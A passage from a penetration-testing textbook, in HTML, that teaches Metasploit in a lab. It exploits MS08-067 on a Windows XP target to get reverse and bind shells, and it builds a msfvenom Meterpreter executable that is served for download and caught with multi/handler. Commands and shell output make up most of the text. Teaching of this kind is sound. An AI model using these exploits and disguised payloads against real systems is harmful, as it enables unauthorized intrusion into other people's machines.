&gt; <span class="strong"><strong>set payload windows/shell_reverse_tcp</strong></span>&#13;
payload =&gt; windows/shell_reverse_tcp</pre><p>Because this is a reverse shell, we need to tell the target where to send the shell; specifically, we need to give it the IP address of the attack machine and the port we will listen on. Running <span class="strong"><strong><code class="literal">show options</code></strong></span> again, shown in <a class="xref" href="ch04.xhtml#module_options_with_a_payload" title="Example 4-9. Module options with a payload">Example 4-9</a>, displays the module as well as the payload options.</p><div class="example"><a id="module_options_with_a_payload"/><div class="example-title">Example 4-9. Module options with a payload</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/smb/ms08_067_netapi):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   RHOST    192.168.20.10    yes       The target address&#13;
   RPORT    445              yes       Set the SMB service port&#13;
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)&#13;
&#13;
&#13;
Payload options (windows/shell_reverse_tcp):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none&#13;
  ❶LHOST                      yes       The listen address&#13;
   LPORT     4444             yes       The listen port&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Automatic Targeting</pre></div></div><p><a class="indexterm" id="iddle1187"/><a class="indexterm" id="iddle1380"/><a class="indexterm" id="iddle2147"/><code class="literal">LHOST</code> ❶ is our local host on the Kali machine, the IP address we want our target machine to connect back to. To find the IP address (if you have forgotten it), enter the Linux <span class="strong"><strong><code class="literal">ifconfig</code></strong></span> command directly into Msfconsole.</p><a id="pro_id00074"/><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>ifconfig</strong></span>&#13;
[*] exec: ifconfig&#13;
&#13;
eth0      Link encap:Ethernet  HWaddr 00:0c:29:0e:8f:11&#13;
          inet addr:192.168.20.9  Bcast:192.168.20.255  Mask:255.255.255.0&#13;
&#13;
<span class="emphasis"><em>--snip--</em></span></pre><p>Now set the <code class="literal">LHOST</code> option with <span class="strong"><strong><code class="literal">set LHOST 192.168.20.9</code></strong></span>. Leave the defaults for <code class="literal">LPORT</code>, for the local port to connect back to, as well as for <code class="literal">EXITFUNC</code>, which tells Metasploit how to exit. Now enter <span class="strong"><strong><code class="literal">exploit</code></strong></span>, shown in <a class="xref" href="ch04.xhtml#running_the_exploit-id00016" title="Example 4-10. Running the exploit">Example 4-10</a>, to send our exploit off again, and wait for the shell to appear.</p><div class="example"><a id="running_the_exploit-id00016"/><div class="example-title">Example 4-10. Running the exploit</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444 ❶&#13;
[*] Automatically detecting the target...&#13;
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English&#13;
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) ❷&#13;
[*] Attempting to trigger the vulnerability...&#13;
[*] Command shell session 2 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1374)&#13;
    at 2015-08-31 10:29:36 -0400&#13;
&#13;
Microsoft Windows XP [Version 5.1.2600]&#13;
(C) Copyright 1985-2001 Microsoft Corp.&#13;
&#13;
C:\WINDOWS\system32&gt;</pre></div></div><p>Congratulations: You have successfully exploited your first machine!</p><p>Here’s what happened. When we enter <code class="literal">exploit</code>, Metasploit opens a listener on port 4444 to catch the reverse shell from the target ❶. Then, since we kept the target as the default <code class="literal">Automatic Targeting</code>, Metasploit finger printed the remote SMB server and selected the appropriate exploit target for us ❷. Once it selected the exploit, Metasploit sent over the exploit string and attempted to take control of the target machine and execute our selected payload. Because the exploit succeeds, a command shell was caught by our handler.</p><p>To close this shell, type <span class="smaller">ctrl</span>-C and enter <span class="strong"><strong><code class="literal">y</code></strong></span> at the prompt to abort the session.</p><a id="pro_id00075"/><pre class="programlisting">C:\WINDOWS\system32&gt;<span class="strong"><strong>^C</strong></span>&#13;
Abort session 2? [y/N]  <span class="strong"><strong>y</strong></span>&#13;
&#13;
[*] Command shell session 2 closed.  Reason: User exit&#13;
msf  exploit(ms08_067_netapi) &gt;</pre><p><a class="indexterm" id="iddle1473"/><a class="indexterm" id="iddle1759"/><a class="indexterm" id="iddle1760"/>To return to a Meterpreter shell, you can choose a payload with Meterpreter in the name such as <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> and exploit the Windows XP target again.</p></div><div class="sect1" title="Msfcli"><div class="titlepage"><div><div><h2 class="title" id="msfcli" style="clear: both">Msfcli</h2></div></div></div><p>Now for another way to interact with Metasploit: the command line interface, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts and for testing Metasploit modules that you’re developing because it lets you run a module with a quick, one-line command.</p><div class="sect2" title="Getting Help"><div class="titlepage"><div><div><h3 class="title" id="getting_help">Getting Help</h3></div></div></div><p>To run Msfcli, first exit Msfconsole by entering <code class="literal">exit</code>, or just open another Linux console. Msfcli is in our path, so we can call it from anywhere. Let’s begin by looking at the help menu for Msfcli with <span class="strong"><strong><code class="literal">msfcli -h</code></strong></span> (<a class="xref" href="ch04.xhtml#msfcli_help" title="Example 4-11. Msfcli help">Example 4-11</a>).</p><div class="example"><a id="msfcli_help"/><div class="example-title">Example 4-11. Msfcli help</div><div class="example-contents"><pre class="programlisting">  root@kali:~# <span class="strong"><strong>msfcli -h</strong></span>&#13;
❶ Usage: /opt/metasploit/apps/pro/msf3/msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]&#13;
  ==============================================================================&#13;
&#13;
      Mode           Description&#13;
      ----           -----------&#13;
      (A)dvanced     Show available advanced options for this module&#13;
      (AC)tions      Show available actions for this auxiliary module&#13;
      (C)heck        Run the check routine of the selected module&#13;
      (E)xecute      Execute the selected module&#13;
      (H)elp         You're looking at it baby!&#13;
      (I)DS Evasion  Show available ids evasion options for this module&#13;
     ❷(O)ptions      Show available options for this module&#13;
     ❸(P)ayloads     Show available payloads for this module&#13;
      (S)ummary      Show information about this module&#13;
      (T)argets      Show available targets for this exploit module</pre></div></div><p>Unlike with Msfconsole, when using Msfcli, we can tell Metasploit everything it needs to know to run our exploit in just one command ❶. Luckily, Msfcli has some modes to help us build the final command. For example, the <code class="literal">O</code> mode ❷ shows the selected module’s options, and <code class="literal">P</code> shows the compatible payloads ❸.</p></div><div class="sect2" title="Showing Options"><div class="titlepage"><div><div><h3 class="title" id="showing_options">Showing Options</h3></div></div></div><p>Let’s use our MS08-067 exploit against our Windows XP target again. According to the help page, we need to pass Msfcli the exploit name we want to use and set all our options ❶. To show the available options use the <code class="literal">O</code> mode. Enter <span class="strong"><strong><code class="literal">msfcli windows/smb/ms08_067_netapi O</code></strong></span> to see the options for the MS08-067 exploit module, as shown in <a class="xref" href="ch04.xhtml#module_options" title="Example 4-12. Module options">Example 4-12</a>.</p><div class="example"><a id="module_options"/><div class="example-title">Example 4-12. Module options</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfcli windows/smb/ms08_067_netapi O</strong></span>&#13;
[*] Please wait while we load the module tree...&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   RHOST                     yes       The target address&#13;
   RPORT    445              yes       Set the SMB service port&#13;
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</pre></div></div><p><a class="indexterm" id="iddle1108"/><a class="indexterm" id="iddle1916"/>We see the same options as we did in Msfconsole. We’re reminded to set the <code class="literal">RHOST</code> option to the IP address of the target machine, but as we saw on the help page, setting options in Msfcli is a little different from doing do in Msfconsole. Here we say <span class="emphasis"><em><code class="literal">option=value</code></em></span>. For example, to set <code class="literal">RHOST</code>, we enter <code class="literal">RHOST=192.168.20.10</code>.</p></div><div class="sect2" title="Payloads"><div class="titlepage"><div><div><h3 class="title" id="payloads">Payloads</h3></div></div></div><p>For a reminder of the payloads compatible with this module, use the <code class="literal">P</code> mode. Try <span class="strong"><strong><code class="literal">msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P</code></strong></span>, as shown in <a class="xref" href="ch04.xhtml#module_payloads_in_msfcli" title="Example 4-13. Module payloads in Msfcli">Example 4-13</a>.</p><div class="example"><a id="module_payloads_in_msfcli"/><div class="example-title">Example 4-13. Module payloads in Msfcli</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P</strong></span>&#13;
[*] Please wait while we load the module tree...&#13;
&#13;
Compatible payloads&#13;
===================&#13;
&#13;
   Name                                             Description&#13;
   ----                                             -----------&#13;
   generic/custom                                   Use custom string or file as payload. Set&#13;
                                                      either PAYLOADFILE or PAYLOADSTR.&#13;
   generic/debug_trap                               Generate a debug trap in the target process&#13;
   generic/shell_bind_tcp                           Listen for a connection and spawn a command&#13;
                                                      shell&#13;
   generic/shell_reverse_tcp                        Connect back to attacker and spawn a command&#13;
                                                      shell&#13;
   generic/tight_loop                               Generate a tight loop in the target process&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>This time, we’ll use a bind shell payload. Recall that a bind shell just listens on a local port on the target machine. It will be up to our attack machine to connect to the target machine after the payload has run. Recall from our work in Msfconsole that choosing a payload requires additional payload-specific options, which we can view again with the <code class="literal">O</code> flag.</p><p>Because our bind shell won’t be calling back to our attack machine, we don’t need to set the <code class="literal">LHOST</code> option, and we can leave the <code class="literal">LPORT</code> option as the <a class="indexterm" id="iddle1771"/><a class="indexterm" id="iddle1913"/>default of 4444 for now. It looks like we have everything we need to exploit the Windows XP target again. Finally, to tell Msfcli to run the exploit we use the <code class="literal">E</code> flag (<a class="xref" href="ch04.xhtml#running_the_exploit_in_msfcli" title="Example 4-14. Running the exploit in Msfcli">Example 4-14</a>).</p><div class="example"><a id="running_the_exploit_in_msfcli"/><div class="example-title">Example 4-14. Running the exploit in Msfcli</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E</strong></span>&#13;
[*] Please wait while we load the module tree...&#13;
&#13;
RHOST =&gt; 192.168.20.10&#13;
PAYLOAD =&gt; windows/shell_bind_tcp&#13;
[*] Started bind handler ❶&#13;
[*] Automatically detecting the target...&#13;
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English&#13;
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)&#13;
[*] Attempting to trigger the vulnerability...&#13;
[*] Command shell session 1 opened (192.168.20.9:35156 -&gt; 192.168.20.10:4444)&#13;
    at 2015-08-31 16:43:54 -0400&#13;
&#13;
Microsoft Windows XP [Version 5.1.2600]&#13;
(C) Copyright 1985-2001 Microsoft Corp.&#13;
&#13;
C:\WINDOWS\system32&gt;</pre></div></div><p>It looks like everything worked, and we got another shell. But this time, instead of starting a reverse handler listening on the specified local port of 4444, Metasploit starts a handler for the bind shell ❶. After Metasploit sends over the exploit string, the bind handler will automatically connect out to the port specified by the payload and connect to the shell. Once again, we have taken control of the target machine.</p></div></div><div class="sect1" title="Creating Standalone Payloads with Msfvenom"><div class="titlepage"><div><div><h2 class="title" id="creating_standalone_payloads_with_msfven" style="clear: both">Creating Standalone Payloads with Msfvenom</h2></div></div></div><p>In 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools Msfpayload and Msfencode could be used together to create standalone encoded Metasploit payloads in a variety of output formats, such as Windows executables and ASP pages. With the introduction of Msfvenom, the functionality of Msfpayload and Msfencode was combined into a single tool, though Msfpayload and Msfencode are still included in Metasploit. To view Msfvenom’s help page, enter <span class="strong"><strong><code class="literal">msfvenom -h</code></strong></span>.</p><p>So far with Metasploit, our goal has been to exploit a vulnerability on the target system and take control of the machine. Now we’ll do something a little different. Instead of relying on a missing patch or other security issue, we are hoping to exploit the one security issue that may never be fully patched: the users. Msfvenom allows you to build standalone payloads to run on a target system in an attempt to exploit the user whether through a social-engineering attack (<a class="xref" href="ch11.xhtml" title="Chapter 11. Social Engineering">Chapter 11</a>) or by uploading a payload to a vulnerable server, as we’ll see in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>. When all else fails, the user can often be a way in.</p><div class="sect2" title="Choosing a Payload"><div class="titlepage"><div><div><h3 class="title" id="choosing_a_payload">Choosing a Payload</h3></div></div></div><p><a class="indexterm" id="iddle1614"/><a class="indexterm" id="iddle1777"/><a class="indexterm" id="iddle1870"/><a class="indexterm" id="iddle1915"/>To list all the available payloads, enter <span class="strong"><strong><code class="literal">msfvenom -l payloads</code></strong></span>. We’ll use one of Metasploit’s Meterpreter payloads, <code class="literal">windows/meterpreter/reverse_tcp</code>, which provides a reverse connection with a Meterpreter shell. Use <code class="literal">-p</code> to select a payload.</p></div><div class="sect2" title="Setting Options"><div class="titlepage"><div><div><h3 class="title" id="setting_options">Setting Options</h3></div></div></div><p>To see the correct options to use for a module, enter the <code class="literal">-o</code> flag after selecting a payload, as shown in <a class="xref" href="ch04.xhtml#options_in_msfvenom" title="Example 4-15. Options in Msfvenom">Example 4-15</a>.</p><div class="example"><a id="options_in_msfvenom"/><div class="example-title">Example 4-15. Options in Msfvenom</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp -o</strong></span>&#13;
[*] Options for payload/windows/meterpreter/reverse_tcp&#13;
&#13;
    Name      Current Setting  Required  Description&#13;
    ----      ---------------  --------  -----------&#13;
    EXITFUNC  process          yes       Exit technique: seh, thread, process,&#13;
                                           none&#13;
    LHOST                      yes       The listen address&#13;
    LPORT     4444             yes       The listen port</pre></div></div><p>As expected, our <code class="literal">LHOST</code> needs to be set, and our <code class="literal">LPORT</code> is set to the default 4444. For practice, set <code class="literal">LPORT</code> to 12345 by entering <span class="strong"><strong><code class="literal">LPORT=12345</code></strong></span>. We also see <code class="literal">EXITFUNC</code>, which we can leave as the default. Because this is a reverse connection payload, we need to set our <code class="literal">LHOST</code> option to tell the target machine where to connect back to (our Kali machine).</p></div><div class="sect2" title="Choosing an Output Format"><div class="titlepage"><div><div><h3 class="title" id="choosing_an_output_format">Choosing an Output Format</h3></div></div></div><p>Now tell Msfvenom which output format to use. Will we be running this payload from a Windows executable, or do we want to make an ASP file that can be uploaded to a web server we have gained write access to? To see all available output formats, enter <span class="strong"><strong><code class="literal">msfvenom --help-formats</code></strong></span>.</p><a id="pro_id00076"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom --help-formats</strong></span>&#13;
Executable formats&#13;
    asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,&#13;
      loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war&#13;
Transform formats&#13;
    bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,&#13;
      psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript</pre><p>To select the output format, use the <code class="literal">-f</code> option along with the chosen format:</p><a id="pro_id00077"/><pre class="programlisting">msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe</pre><p><a class="indexterm" id="iddle1291"/><a class="indexterm" id="iddle1779"/><a class="indexterm" id="iddle1781"/><a class="indexterm" id="iddle1917"/><a class="indexterm" id="iddle2350"/>But if you run this command as is, you’ll see garbage printed to the console. While this is technically our executable payload, it doesn’t do us much good. Instead, let’s redirect the output to an executable file, <span class="emphasis"><em>chapter4example.exe</em></span>.</p><a id="pro_id00078"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe</strong></span> &gt; <span class="strong"><strong>chapter4example.exe</strong></span>&#13;
root@kali:~# <span class="strong"><strong>file chapter4example.exe</strong></span>&#13;
chapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit</pre><p>There is no output to the screen, but if we run the <code class="literal">file</code> command on our newly created executable file, we see that it’s a Windows executable that will run on <span class="emphasis"><em>any</em></span> Windows system as long as a user attempts to run it. (Later, in <a class="xref" href="ch12.xhtml" title="Chapter 12. Bypassing Antivirus Applications">Chapter 12</a>, we’ll see cases where antivirus applications stop a Metasploit payload and learn ways we can obfuscate our standalone payloads to bypass antivirus programs. Also, we will cover clever ways to lure users into downloading and running malicious payloads in <a class="xref" href="ch11.xhtml" title="Chapter 11. Social Engineering">Chapter 11</a>.)</p></div><div class="sect2" title="Serving Payloads"><div class="titlepage"><div><div><h3 class="title" id="serving_payloads">Serving Payloads</h3></div></div></div><p>One good way to serve up payloads is to host them on a web server, disguise them as something useful, and lure users into downloading them. For this example, we’ll host our Metasploit executable on our Kali machine’s builtin Apache server and browse to the file from our target machine.</p><p>First, run <span class="strong"><strong><code class="literal">cp chapter4example.exe /var/www</code></strong></span> to copy the payload executable to the Apache directory, and then make sure the web server is started with <span class="strong"><strong><code class="literal">service apache2 start</code></strong></span>.</p><a id="pro_id00079"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cp chapter4example.exe /var/www</strong></span>&#13;
root@kali:~# <span class="strong"><strong>service apache2 start</strong></span>&#13;
Starting web server apache2                                           [ OK ]</pre><p>Now switch to your Windows XP target and open Internet Explorer. Browse to <span class="emphasis"><em><a class="ulink" href="http://192.168.20.9/chapter4example.exe" target="_top">http://192.168.20.9/chapter4example.exe</a></em></span> and download the file. But before we run the file, we have one loose end to deal with.</p><p>So far when attempting to exploit our target machine, Metasploit set up our payload handlers and sent the exploit. When we used Msfconsole to exploit the MS08-067 vulnerability with a reverse shell payload, Metasploit first set up a handler listening on port 4444 for the reverse connection, but up to this point we have nothing listening for a reverse connection from the payload we created with Msfvenom.</p></div><div class="sect2" title="Using the Multi/Handler Module"><div class="titlepage"><div><div><h3 class="title" id="using_the_multisolidushandler_module">Using the Multi/Handler Module</h3></div></div></div><p>Start Msfconsole again, and we’ll look at a Metasploit module called <span class="emphasis"><em>multi/handler</em></span>. This module allows us to set up standalone handlers, which is just what we’re lacking. We need a handler to catch our Meterpreter connection when our malicious executable is run from the Windows XP target. Select the <span class="emphasis"><em>multi/handler</em></span> module with <span class="strong"><strong><code class="literal">use multi/handler</code></strong></span>.</p><p>The first thing to do is tell <span class="emphasis"><em>multi/handler</em></span> which of Metasploit’s many handlers we need. We need to catch the <code class="literal">windows/meterpreter/reverse_tcp</code> payload we used when we created our executable with Msfvenom. Choose it with <span class="strong"><strong><code class="literal">set PAYLOAD windows/meterpreter/reverse_tcp</code></strong></span>, and follow it with <span class="strong"><strong><code class="literal">show options</code></strong></span> (<a class="xref" href="ch04.xhtml#options_with_multisolidushandler" title="Example 4-16. Options with multi/handler">Example 4-16</a>).</p><div class="example"><a id="options_with_multisolidushandler"/><div class="example-title">Example 4-16. Options with multi/handler</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use multi/handler</strong></span>&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set PAYLOAD windows/meterpreter/reverse_tcp</strong></span>&#13;
PAYLOAD =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/multi/handler):&#13;
&#13;
   Name  Current Setting  Required  Description&#13;
   ----  ---------------  --------  -----------&#13;
&#13;
&#13;
Payload options (windows/meterpreter/reverse_tcp):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
   EXITFUNC  process          yes       Exit technique: seh, thread, process,&#13;
                                          none&#13;
   LHOST                      yes       The listen address&#13;
   LPORT     4444             yes       The listen port&#13;
&#13;
<span class="emphasis"><em>--snip--</em></span>&#13;
msf  exploit(handler) &gt;</pre></div></div><p>From here we tell Metasploit which setup we used when we created the payload. We’ll set the <code class="literal">LHOST</code> option to our local Kali IP address and the <code class="literal">LPORT</code> to the port we chose in Msfvenom, in this case 192.168.20.9 and 12345, respectively. Once all the options for the payload are set correctly, enter <span class="strong"><strong><code class="literal">exploit</code></strong></span>, as shown in <a class="xref" href="ch04.xhtml#setting_up_a_handler" title="Example 4-17. Setting up a handler">Example 4-17</a>.</p><div class="example"><a id="setting_up_a_handler"/><div class="example-title">Example 4-17. Setting up a handler</div><div class="example-contents"><pre class="programlisting">msf  exploit(handler) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set LPORT 12345</strong></span>&#13;
LPORT =&gt; 12345&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:12345&#13;
[*] Starting the payload handler...</pre></div></div><p>As you can see, Metasploit sets up a reverse handler on port 12345 as instructed, listening for a payload to call back.</p><p><a class="indexterm" id="iddle1690"/>Now we can switch back to our Windows XP target and run our downloaded executable. Run <span class="emphasis"><em>chapter4example.exe</em></span> on your Windows target. Back in Msfconsole, you should see that the handler receives the reverse connection, and you receive a Meterpreter session.</p><a id="pro_id00080"/><pre class="programlisting">[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 1 opened (192.168.20.9:12345 -&gt; 192.168.20.10:49437) at 2015-09-01 11:20:00 -0400&#13;
&#13;
meterpreter &gt;</pre><p>Spend some time experimenting with Msfvenom if you like. We’ll return to this useful tool when we attempt to bypass antivirus solutions in <a class="xref" href="ch12.xhtml" title="Chapter 12. Bypassing Antivirus Applications">Chapter 12</a>.</p></div></div><div class="sect1" title="Using an Auxiliary Module"><div class="titlepage"><div><div><h2 class="title" id="using_an_auxiliary_module" style="clear: both">Using an Auxiliary Module</h2></div></div></div><p>Metasploit was first conceived as an exploitation framework, and it continues to be a top contender in the world of exploitation. But in the ensuing years, its functionality has grown in about as many directions as there are creative minds working on it. I sometimes quip that Metasploit can do everything except my laundry, and I’m currently working on a module for that.</p><p>Dirty socks aside, in addition to exploitation, Metasploit has modules to aid in every phase of pentesting. Some modules that are not used for exploitation are known as <span class="emphasis"><em>auxiliary modules</em></span>; they include things like vulnerability scanners, fuzzers, and even denial of service modules. (A good rule of thumb to remember is that exploit modules use a payload and auxiliary modules do not.)</p><p>For example, when we first used the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> exploit module earlier in this chapter, one of its options was <code class="literal">SMBPIPE</code>. The default value for that option was <code class="literal">BROWSER</code>. Let’s look at an auxiliary module that will enumerate the listening pipes on an SMB server, <span class="emphasis"><em>auxiliary/scanner/smb/pipe_auditor</em></span> (<a class="xref" href="ch04.xhtml#options_for_scannersolidussmbsoliduspipe" title="Example 4-18. Options for scanner/smb/pipe_auditor">Example 4-18</a>). (We use auxiliary modules like exploits, and like exploits we can also drop the <span class="emphasis"><em>auxiliary/</em></span> part of the module name.)</p><div class="example"><a id="options_for_scannersolidussmbsoliduspipe"/><div class="example-title">Example 4-18. Options for scanner/smb/pipe_auditor</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use scanner/smb/pipe_auditor</strong></span>&#13;
msf  auxiliary(pipe_auditor) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (auxiliary/scanner/smb/pipe_auditor):&#13;
&#13;
   Name       Current Setting  Required  Description&#13;
   ----       ---------------  --------  -----------&#13;
  ❶RHOSTS                      yes       The target address range or CIDR identifier&#13;
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication&#13;
   SMBPass                     no        The password for the specified username&#13;
   SMBUser                     no        The username to authenticate as&#13;
   THREADS    1                yes       The number of concurrent threads</pre></div></div><p><a class="indexterm" id="iddle1707"/><a class="indexterm" id="iddle1767"/>The options for this module are a bit different from what we’ve seen so far. Instead of <code class="literal">RHOST</code> we have <code class="literal">RHOSTS</code> ❶, which allows us to specify more than one remote host to run the module against. (Auxiliaries can be run against multiple hosts, whereas exploits can exploit only one system at a time.)</p><p>We also see options for <code class="literal">SMBUser</code>, <code class="literal">SMBPass</code>, and <code class="literal">SMBDomain</code>. Because our Windows XP target is not part of any domain, we can leave the <code class="literal">SMBDomain</code> at the default value, <code class="literal">WORKGROUP</code>. We can leave the <code class="literal">SMBUser</code> and <code class="literal">SMBPass</code> values blank. The <code class="literal">THREADS</code> option allows us to control the speed of Metasploit by having our module run in multiple threads. We’re scanning only one system in this case, so the default value of <code class="literal">1</code> thread will work fine. The only option we need to set is <code class="literal">RHOSTS</code> to the IP address of our Windows XP target.</p><a id="pro_id00081"/><pre class="programlisting">msf  auxiliary(pipe_auditor) &gt; <span class="strong"><strong>set RHOSTS 192.168.20.10</strong></span>&#13;
RHOSTS =&gt; 192.168.20.10</pre><p>Even though we aren’t technically exploiting anything in this case, we can still tell Metasploit to run our auxiliary module by entering <span class="strong"><strong><code class="literal">exploit</code></strong></span>.</p><a id="pro_id00082"/><pre class="programlisting">msf  auxiliary(pipe_auditor) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] 192.168.20.10 - Pipes: \browser ❶&#13;
[*] Scanned 1 of 1 hosts (100% complete)&#13;
[*] Auxiliary module execution completed&#13;
msf  auxiliary(pipe_auditor) &gt;</pre><p>The module audits the listening SMB pipes on our Windows XP target. As it turns out, the browser pipe is the only available pipe ❶. Because this pipe is listening, this is the correct value for the <code class="literal">SMBPIPE</code> option in the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> exploit module we used earlier in the chapter.</p><div class="sidebar"><a id="updating_metasploit"/><div class="sidebar-title">Updating Metasploit</div><p>The exercises in this book are designed to work on a base install of Kali Linux 1.0.6. Naturally, many security tools used in this book will have been updated since Kali’s release. Metasploit in particular receives regular updates from core developers as well as from the security community.</p><p>All of the material in this book works with the Metasploit version installed on Kali 1.0.6. As you continue your career as a pentester, you’ll want the latest Metasploit modules. The Metasploit Project is typically pretty solid at releasing modules for the latest security issues circulating the Web. To pull down the latest modules from Metasploit’s GitHub, enter the following: root@kali:~# msfupdate</p><a id="pro_id00083"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfupdate</strong></span></pre></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00017" style="clear: both">Summary</h2></div></div></div><p>In this chapter we’ve gotten comfortable using some of Metasploit’s interfaces. We’ll return to Metasploit throughout the book.</p><p>In the next few chapters we’ll simulate a penetration test against our target machines, covering a wide variety of vulnerability types. If you pursue a career in penetration testing, you will likely encounter clients spanning the gamut of possible security postures. Some will be missing so many patches across the organization that you may wonder if they have updated since installing the base image back in 2001. Along with missing patches, you may find additional vulnerabilities such as default passwords and misconfigured services. Gaining access to such networks is trivial for skilled penetration testers.</p><p>On the other hand, you may also find yourself working for clients who have patch management down pat, with everything from Windows operating systems to all third-party software on a regular patch cycle across the organization. Some clients may deploy cutting-edge security controls such as proxies that allow only Internet Explorer to call out to the Internet. This will stop even Metasploit reverse shells that call back on ports 80 or 443 and look like web traffic, unless you are able to exploit the Internet Explorer program, which may also be completely patched. You may find intrusion prevention firewalls at the perimeter that drop any string that looks even a little bit like attack traffic.</p><p>Simply throwing the MS08-067 Metasploit module at these high-security networks will get you no results, except maybe a call from a network monitoring vendor with a warrant for your arrest. (Don’t worry: As part of the penetration test, you will have a get-out-of-jail-free card.) But even highly secure networks are only as strong as their weakest link. For instance, I once performed an onsite penetration test for a company that employed all of the security controls I just mentioned. However, the local administrator password on all the Windows workstations was the same five-letter dictionary word. After I cracked the password, I was able to log on as an administrator on every workstation on the network. From there I was able to use something called <span class="emphasis"><em>token impersonation</em></span> to gain domain administrator access. Despite all the strong security controls, with a little effort I was able to take over the network the same way I would a network with missing patches from 2003.</p><p>As you work through the rest of this book, you will pick up not only the technical skills required to break into vulnerable systems but also the mindset required to find a way in when none seems readily apparent.</p><p>Now let’s turn our attention to gathering information about our targets so we can develop a solid plan of attack.</p></div></section></body></html>